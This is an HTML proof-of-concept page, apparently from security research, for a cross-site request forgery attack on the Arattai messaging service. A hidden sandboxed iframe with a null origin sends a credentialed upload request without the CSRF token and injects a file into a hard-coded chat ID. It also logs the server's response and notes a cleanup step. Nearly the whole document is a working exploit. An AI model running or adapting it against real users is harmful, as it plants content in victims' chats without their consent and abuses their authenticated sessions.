<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>PoC — CSRF Upload via null-origin iframe</title></head>
<body>
<h3>CSRF Upload — null origin (sandboxed iframe)</h3>
<p>Attacker origin: <b id="host"></b> &nbsp;|&nbsp; Iframe origin: <b>null</b></p>
<pre id="out" style="white-space:pre-wrap;word-break:break-all;margin-top:1em;"></pre>

<iframe id="pwn" sandbox="allow-scripts" style="display:none"></iframe>

<script>
document.getElementById('host').textContent = location.origin;

// ── CONFIG ────────────────────────────────────────────────────────────────────
const TARGET_CHATID = "CT_1469007622159071968_3335514-GC";
const FILE_NAME     = "important-invoice.txt";
const FILE_BODY     = "This file was injected without the victim's knowledge (PoC 05b).";
// ─────────────────────────────────────────────────────────────────────────────

// Minimal headers confirmed from live request — no Upload-Id, no hash body,
// no CSRF token, no X-Dfs-Service / X-Streammode / X-Body_attr_size needed.
var inner = '';
inner += 'var xhr=new XMLHttpRequest();';
inner += 'xhr.open("POST","https://files.arattai.in/webupload");';
inner += 'xhr.withCredentials=true;';
inner += 'xhr.setRequestHeader("X-Service","arattai");';
inner += 'xhr.setRequestHeader("X-Arattai-Type","multi_recip");';
inner += 'xhr.setRequestHeader("X-Arattai-Chatids",' + JSON.stringify(TARGET_CHATID) + ');';
inner += 'xhr.setRequestHeader("File-Name",'          + JSON.stringify(FILE_NAME)     + ');';
// X-Zcsrf-Token intentionally omitted
inner += 'xhr.onload=function(){parent.postMessage({type:"done",status:xhr.status,body:xhr.responseText},"*");};';
inner += 'xhr.onerror=function(){parent.postMessage({type:"err",msg:"CORS preflight blocked or network error"},"*");};';
inner += 'xhr.send(' + JSON.stringify(FILE_BODY) + ');';
inner += 'parent.postMessage({type:"sent"},"*");';

document.getElementById('pwn').srcdoc = '<script>' + inner + '<\/script>';

var log = document.getElementById('out');
window.addEventListener('message', function(e) {
    var d = e.data;
    if (d.type === 'sent') {
        log.textContent += '[SENT] POST /webupload  Origin: null\n';
        log.textContent += '       File-Name: ' + FILE_NAME + '\n';
        log.textContent += '       X-Arattai-Chatids: ' + TARGET_CHATID + '\n';
        log.textContent += '       X-Zcsrf-Token: (omitted)\n\n';
    } else if (d.type === 'done') {
        log.textContent += '[RESPONSE] HTTP ' + d.status + '\n' + d.body + '\n';
        if (d.status === 200) {
            log.textContent += '\n[CONFIRMED] File injected into chat without CSRF token.\n';
            log.textContent += '            Check: ' + TARGET_CHATID + '\n';
            log.textContent += '            CLEANUP: delete the injected file from the chat.\n';
        } else {
            log.textContent += '[RESULT] HTTP ' + d.status + ' — rejected.\n';
        }
    } else if (d.type === 'err') {
        log.textContent += '[BLOCKED] ' + d.msg + '\n';
    }
});
</script>
</body>
</html>
